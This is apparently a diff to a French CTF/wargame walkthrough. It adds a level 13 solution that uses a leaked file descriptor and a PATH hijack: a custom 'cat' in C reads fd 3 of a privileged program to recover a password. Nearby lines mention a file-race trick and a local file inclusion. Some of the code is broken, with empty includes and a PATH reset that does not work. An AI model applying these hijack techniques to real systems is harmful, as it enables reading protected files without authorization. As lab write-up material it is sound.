@@ -71,6 +71,38 @@
 - Executer `script` script sur une fenetre et executer `pytong` sur une autre comme ceci : 
 - `cd /home/level/12_pytong` et `./level12 /home/user/randy/changedfile` : executer le level12 dans le fichier qui change de contenu et le mot de passe s'affiche .
 
+  # [ level 13 ]
+## Dans ce challenge , apres avoir analyser la version compiler de tryout.c et quelque recherche sur internet, j'ai decouvert les descripteur de fichier (Il s'agit d'un identifiant digital utilisé pour désigner un fichier ouvert.) dans le repertoire /proc/self/fd/ . Dans notre cas, le descripteur de fichier 3 est attribué à solution.txt, qui contient notre solution. Toutefois, le descripteur de fichier de solution.txt reste ouvert jusqu'à la fin du programme, même après l'utilisation de /dev/urandom, ce qui paraît inhabituel. C'est cette anomalie que nous allons utiliser à notre avantage.
+## Pour exploiter cette faille nous devons creer notre propre version de cat , ou prendre la version de quelqu'un d'autre . 
+- Personnelement , j'ai trouver ce code cat sur internet :
+ <pre>
+#include
+#include
+#include
+
+       int main(int argc, char *argv[]) {
+       FILE *fp = fopen(argv[1], "w");
+               char buf[16];
+       memset(buf, 0, sizeof buf);
+       lseek(3, 0, SEEK_SET);
+       read(3, buf, sizeof buf);
+        fprintf(fp, "%s", buf);
+    return 0;
+}
+    </pre>
+    
+- nous allons ensuite compiler ce code avec la commande suivante : `gcc -m32 cat.c -o cat` et `cat` deviendra la  version compiler de cat.c , le nom du programme compiler doit etre `cat` parce qu'on doit faire en sorte que le programme utilise notre `cat` au lieu de la commande de base . 
+- On executera ensuite notre `cat` dans notre repertoire personnel `./cat ` .
+- On doit changer la variable de l'environnement pour faciliter l'acces aux scripts ou programmes dans notre répertoire personnel  avec la commande suivante :
+```
+export PATH=$HOME:$PATH
+```
+- puis `cd /home/level/matrixman/13_try_outs` et on execute `tryouts`
+- Après l'exécution de `tryouts`, on quitte le programme et on remet la variable d'environnement à sa valeur initiale avec la commande suivante :
+  ```
+  export PATH=$PATH
+- Puis on fait juste `nano /home/user/randy/seed` et on obtient notre mot de passe . 
+
 # [ level 14 ]
 ##  Dans ce challenge ,pour récupéré le mot de passe dans le fichier solution.php, on doit realiser un Local File Intrusion.
 - Cliquez sur le lien du challenge  **Live LFI** puis elle vous redirigera vers un site .
